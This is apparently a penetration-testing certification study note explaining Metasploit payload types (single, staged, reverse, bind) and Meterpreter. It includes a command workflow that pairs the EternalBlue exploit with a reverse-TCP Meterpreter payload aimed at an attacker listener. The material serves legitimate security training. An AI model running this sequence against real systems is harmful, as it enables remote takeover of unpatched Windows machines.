# 💣 Payloads

---

## 🎯 What Is a Payload?

A **Payload** is the part of an exploit that performs an action **after the exploit successfully compromises the target**.

The easiest mental model is:

```text
💣 EXPLOIT
   │
   │ Exploits the vulnerability
   ▼
🎯 Target
   │
   │ Vulnerability successfully exploited
   ▼
📦 PAYLOAD
   │
   │ Performs the desired action
   ▼
🐚 Shell / Meterpreter / Command / etc.
```

> [!important] Exploit vs Payload  
> **Exploit = How do I get code execution?**
> 
> **Payload = What do I want to execute/do after I get code execution?**

For example:

```text
Exploit:
exploit/windows/smb/ms17_010_eternalblue

Payload:
windows/x64/meterpreter/reverse_tcp
```

The exploit takes advantage of the **MS17-010 vulnerability**, while the payload establishes the desired session.

---

# 🧩 The 3 Payload Types

Metasploit payloads can be divided into:

```text
📦 Payloads
│
├── 1️⃣ Singles
│
├── 2️⃣ Stagers
│
└── 3️⃣ Stages
```

Whether a payload is **staged** can often be recognized from its name.

### 🔑 Naming Difference

```text
windows/shell_bind_tcp
```

➡️ **Single / Inline payload**

```text
windows/shell/bind_tcp
```

➡️ **Staged payload**

The `/` structure is an important clue.

---

# 1️⃣ Singles

A **Single** payload is self-contained.

It contains everything required to perform its task in one payload.

```text
Exploit
   │
   ▼
┌─────────────────────┐
│  Single Payload     │
│                     │
│  Everything needed  │
│  is included here   │
└─────────────────────┘
   │
   ▼
Result
```

### 🧠 Example

```text
windows/x64/shell_reverse_tcp
```

This is an **inline/single payload**.

The payload contains the functionality required to establish the reverse shell without separately downloading a Stage.

### ✅ Advantages

- Self-contained
    
- No separate Stage required
    
- Generally more stable
    
- Only one payload is sent
    

### ❌ Disadvantages

- Can become large
    
- Some exploits have strict payload-size limitations
    

> [!tip] Mental Model  
> **Single = Everything in one package 📦**

---

# 2️⃣ Stagers

A **Stager** is a small payload whose primary job is to establish communication and prepare for the larger Stage.

```text
Exploit
   │
   ▼
Small Stager
   │
   │ Establish connection
   ▼
Attacker Listener
   │
   │ Send larger Stage
   ▼
Stage
```

The Stager is intentionally kept **small and reliable** because the initial exploit may have limited space available.

### Example

```text
windows/x64/meterpreter/reverse_tcp
```

The:

```text
reverse_tcp
```

part represents the communication mechanism used by the stager.

### 🧠 Stager's Job

```text
1. Execute on target
        ↓
2. Establish connection
        ↓
3. Communicate with attacker
        ↓
4. Receive the larger Stage
```

> [!important] Remember  
> **Stager = Establishes the communication channel and retrieves the Stage.**

---

# 3️⃣ Stages

A **Stage** is the larger payload component delivered by the Stager.

Stages can contain much more functionality because they are not constrained by the same small initial payload space.

```text
             STAGER
                │
                │ "Connection established"
                ▼
          ATTACKER LISTENER
                │
                │ Sends Stage
                ▼
             STAGE
                │
                ▼
       Full functionality
```

Examples of functionality provided by stages include:

- Meterpreter
    
- VNC injection
    
- Interactive shells
    
- Other advanced capabilities
    

> [!tip] Mental Model  
> **Stager = Delivery mechanism 🚚**
> 
> **Stage = Actual large payload 📦**

---

# 🔗 Staged Payloads

A **staged payload** separates the payload into multiple components.

Instead of sending everything at once:

```text
Exploit → Entire Payload
```

we use:

```text
Exploit
   │
   ▼
Stage 0 / Stager
   │
   │ Establish connection
   ▼
Attacker
   │
   │ Deliver larger payload
   ▼
Stage 1
   │
   ▼
Full functionality
```

### 🧠 Stage 0

The initial code is responsible for establishing the communication channel.

Common connection types include:

```text
reverse_tcp
reverse_http
reverse_https
bind_tcp
```

### 🧠 Stage 1

The larger payload is then delivered across the established communication channel.

For example:

```text
Stage 0
   ↓
Establish reverse TCP connection
   ↓
Stage 1
   ↓
Meterpreter
```

---

# 🔄 Reverse vs Bind Payloads

This is another concept that you should separate from **Single vs Staged**.

These describe **how the connection is established**.

## 🔴 Reverse Connection

The **target connects back to the attacker**.

```text
ATTACKER
10.10.14.15
    ▲
    │
    │ Reverse connection
    │
    │
TARGET
10.10.10.40
```

The target initiates the connection.

Example:

```text
windows/x64/meterpreter/reverse_tcp
```

### Why are reverse connections common?

Firewalls often restrict **incoming** connections more heavily than outgoing connections.

Therefore:

```text
Target ────────► Attacker
       outbound
```

may be easier to establish than:

```text
Attacker ────────► Target
          inbound
```

> [!warning] Important  
> Outbound traffic is **not automatically trusted**. Modern networks can monitor and restrict outbound connections as well.

---

## 🔵 Bind Connection

With a **bind payload**, the target opens/listens on a port and the attacker connects to it.

```text
TARGET
10.10.10.40
    │
    │ Listening
    │
    ▼
  Port
    ▲
    │
    │ Attacker connects
    │
ATTACKER
10.10.14.15
```

Example:

```text
windows/x64/meterpreter/bind_tcp
```

### 🧠 Easy Memory Trick

```text
🔴 REVERSE
Target → Attacker

🔵 BIND
Attacker → Target
```

---

# 🧠 Single vs Staged

Do not confuse:

```text
Single vs Staged
```

with:

```text
Reverse vs Bind
```

They describe **different things**.

|Concept|Question|
|---|---|
|**Single**|Is everything contained in one payload?|
|**Staged**|Is the payload split into Stager + Stage?|
|**Reverse**|Who initiates the connection?|
|**Bind**|Who listens for the connection?|

Therefore you can have combinations such as:

```text
Single + Reverse
windows/x64/meterpreter_reverse_tcp

Staged + Reverse
windows/x64/meterpreter/reverse_tcp

Single + Bind
windows/x64/meterpreter_bind_tcp

Staged + Bind
windows/x64/meterpreter/bind_tcp
```

---

# 🧩 Understanding the Payload Name

Payload names become much easier once you learn how to read them.

Consider:

```text
windows/x64/meterpreter/reverse_tcp
```

Break it down:

```text
windows
   │
   └── Platform

x64
   │
   └── Architecture

meterpreter
   │
   └── Payload functionality

reverse_tcp
   │
   └── Stager / connection method
```

This is a:

> **Windows x64 Meterpreter staged reverse TCP payload.**

Now compare:

```text
windows/x64/meterpreter_reverse_tcp
```

The naming structure indicates an **inline/single Meterpreter reverse TCP payload**.

### 🔑 Key Difference

```text
meterpreter/reverse_tcp
         ↑
    Staged structure


meterpreter_reverse_tcp
         ↑
    Inline structure
```

---

# 🐺 Meterpreter

**Meterpreter** is an advanced Metasploit payload that provides an interactive session with extensive post-exploitation functionality.

Instead of simply giving you:

```text
C:\Users>
```

you receive:

```text
meterpreter >
```

Meterpreter provides functionality such as:

- File-system interaction
    
- Process management
    
- Network information
    
- System information
    
- Privilege-related functionality
    
- Screenshot capabilities
    
- Session management
    
- Loading extensions
    
- Pivoting capabilities
    

### 🧠 Meterpreter Session

```text
Exploit
   │
   ▼
Payload
   │
   ▼
Meterpreter
   │
   ▼
meterpreter >
```

---

# ⚙️ Meterpreter vs Windows CMD

Meterpreter commands are **not Windows CMD commands**.

For example:

```text
meterpreter > whoami
[-] Unknown command: whoami
```

Instead:

```text
meterpreter > getuid
```

returns the user associated with the Meterpreter process.

If you want an actual Windows command shell:

```text
meterpreter > shell
```

You may then receive:

```text
Microsoft Windows [Version 6.1.7601]

C:\Users>
```

Now normal Windows commands work:

```text
C:\Users>whoami
nt authority\system
```

### 🧠 Remember

```text
meterpreter >
     │
     └── Meterpreter commands

C:\Users>
     │
     └── Windows CMD commands
```

---

# 🔎 Searching for Payloads

Metasploit contains a very large number of payloads.

To list them:

```text
show payloads
```

Example:

```text
msf6 > show payloads
```

Because the list can be huge, use `grep` to filter it.

---

# 🔍 Using `grep`

Suppose we want Meterpreter payloads.

```text
grep meterpreter show payloads
```

This filters the results to entries containing:

```text
meterpreter
```

You can then add another filter:

```text
grep meterpreter grep reverse_tcp show payloads
```

Now you are effectively asking:

```text
Show payloads
      ↓
containing "meterpreter"
      ↓
AND containing "reverse_tcp"
```

This dramatically reduces the list.

### 🧠 General Pattern

```text
grep <keyword> <command>
```

Multiple filters can be chained:

```text
grep <keyword1> grep <keyword2> <command>
```

> [!tip] CPTS Tip  
> Don't manually scroll through hundreds of payloads.
> 
> **Filter first → understand the remaining options → select the appropriate payload.**

---

# 🎯 Selecting a Payload

Once you find the desired payload, select it with:

```text
set payload <payload>
```

Example:

```text
set payload windows/x64/meterpreter/reverse_tcp
```

Metasploit will then add the payload's options to:

```text
show options
```

---

# ⚙️ Payload Options

After selecting:

```text
windows/x64/meterpreter/reverse_tcp
```

you may see:

```text
Payload options:

Name      Current Setting    Required
----      ---------------    --------
EXITFUNC  thread              yes
LHOST                         yes
LPORT     4444                yes
```

The important options are usually:

### `LHOST`

The attacker's IP address that the target should connect back to.

```text
LHOST = 10.10.14.15
```

Think:

> **"Where should the reverse connection come back to?"**

### `LPORT`

The port on the attacker where Metasploit listens for the connection.

```text
LPORT = 4444
```

Think:

> **"Which port should receive the reverse connection?"**

---

# 🎯 Exploit Options vs Payload Options

After selecting a payload, `show options` can contain both.

```text
┌──────────────────────────────┐
│      EXPLOIT OPTIONS         │
├──────────────────────────────┤
│ RHOSTS → Target IP           │
│ RPORT  → Target service      │
└──────────────────────────────┘

┌──────────────────────────────┐
│      PAYLOAD OPTIONS         │
├──────────────────────────────┤
│ LHOST → Attacker IP          │
│ LPORT → Listener port        │
└──────────────────────────────┘
```

### 🔑 Easy Memory Trick

```text
R = Remote
L = Local

RHOSTS → Remote target
RPORT  → Remote target port

LHOST  → Local/attacker IP
LPORT  → Local/listener port
```

---

# 🧪 Example Workflow

For an authorized HTB target:

```text
use exploit/windows/smb/ms17_010_eternalblue
```

Check available payloads:

```text
show payloads
```

Filter them:

```text
grep meterpreter grep reverse_tcp show payloads
```

Select one:

```text
set payload windows/x64/meterpreter/reverse_tcp
```

Check configuration:

```text
show options
```

Configure the target:

```text
set RHOSTS <TARGET_IP>
```

Configure the listener:

```text
set LHOST <ATTACKER_IP>
```

Then verify everything:

```text
show options
```

Mental picture:

```text
                 💥 EXPLOIT
                     │
                     ▼
              TARGET MACHINE
                     │
                     │ Stage 0
                     │
                     ▼
              Reverse TCP
                     │
                     ▼
             ATTACKER LISTENER
                     │
                     │ Stage 1
                     ▼
               🐺 Meterpreter
                     │
                     ▼
                meterpreter >
```

---

# 🧠 The Complete Payload Mental Model

```text
                         📦 PAYLOAD
                             │
              ┌──────────────┴──────────────┐
              │                             │
          1️⃣ SINGLE                    2️⃣ STAGED
              │                             │
       Everything together          ┌───────┴───────┐
                                    │               │
                                 STAGER           STAGE
                                    │               │
                              Establishes       Larger
                              connection       payload
```

Then independently:

```text
              CONNECTION TYPE
                    │
           ┌────────┴────────┐
           │                 │
       🔴 REVERSE          🔵 BIND
           │                 │
    Target → Attacker   Attacker → Target
```

And the Stage can provide functionality such as:

```text
                    STAGE
                      │
          ┌───────────┼───────────┐
          ▼           ▼           ▼
      🐺 Meterpreter  🖥️ VNC    🐚 Shell
```

---

# ⭐ CPTS Key Takeaways

> [!important] 1. Exploit vs Payload  
> **Exploit** = takes advantage of the vulnerability.
> 
> **Payload** = performs the desired action after exploitation.

> [!important] 2. Single  
> **Single = everything is contained in one payload.**

> [!important] 3. Stager  
> **Stager = small component that establishes communication and retrieves the Stage.**

> [!important] 4. Stage  
> **Stage = larger payload component containing the actual functionality.**

> [!important] 5. Reverse vs Bind  
> **Reverse:** target connects to attacker.
> 
> **Bind:** attacker connects to target.

> [!important] 6. Meterpreter  
> **Meterpreter = advanced interactive Metasploit session with extensive post-exploitation capabilities.**

> [!important] 7. LHOST vs RHOSTS  
> **RHOSTS = target machine.**
> 
> **LHOST = attacker/listener machine.**

---

# 🧠 Final Memory Map

```text
                 💣 METASPLOIT EXPLOIT
                         │
                         ▼
                    📦 PAYLOAD
                         │
              ┌──────────┴──────────┐
              │                     │
           SINGLE                 STAGED
              │                     │
       All-in-one             ┌─────┴─────┐
                              ▼           ▼
                           STAGER       STAGE
                              │           │
                              └─────┬─────┘
                                    │
                              Connection
                                    │
                         ┌──────────┴──────────┐
                         │                     │
                      REVERSE                BIND
                         │                     │
                  Target → Attacker      Attacker → Target
                         │
                         ▼
                   🐺 METERPRETER
                         │
                         ▼
                  meterpreter >
```

### 🔥 One Sentence to Remember

> **The exploit gets you code execution; the payload determines what happens next; a stager establishes the connection; a stage delivers the larger functionality; and Meterpreter gives you an advanced interactive session.**